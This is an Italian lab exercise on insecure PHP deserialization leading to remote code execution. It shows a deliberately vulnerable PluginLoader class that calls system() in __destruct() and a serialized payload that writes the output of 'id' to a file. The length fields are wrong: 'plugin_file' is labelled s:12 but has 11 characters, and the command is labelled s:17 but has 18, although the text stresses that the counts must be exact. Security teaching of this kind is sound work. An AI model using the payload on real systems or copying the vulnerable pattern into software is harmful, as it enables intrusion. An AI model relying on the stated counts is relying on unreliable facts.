💉 Esercizio 1: Deserializzazione Non Sicura

Da stringa serializzata a Remote Code Execution
🎯 Come Funziona l'Attacco
PHP unserialize() ricostruisce oggetti da stringhe. Se la classe ha magic methods pericolosi, vengono eseguiti automaticamente:

• __wakeup() → chiamato durante unserialize
• __destruct() → chiamato quando l'oggetto viene distrutto
• __toString() → chiamato quando l'oggetto diventa stringa
🔍 La Classe Vulnerabile
Nel file PluginLoader.php:
class PluginLoader { public $plugin_file; public $command; function __destruct() { if ($this->command) { system($this->command); // RCE! } } }
📝 Anatomia del Payload
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}

Spiegazione:
• O:12:"PluginLoader" → Oggetto della classe PluginLoader (12 caratteri)
• :2: → 2 proprietà
• s:12:"plugin_file";s:0:"" → proprietà plugin_file, stringa vuota
• s:7:"command";s:17:"id > /tmp/test.txt" → comando da eseguire (17 caratteri)
⚠️ Nota Importante
La lunghezza della stringa nel payload deve essere esatta. s:17 significa che il comando ha esattamente 17 caratteri. Se cambi il comando, aggiorna anche il numero!
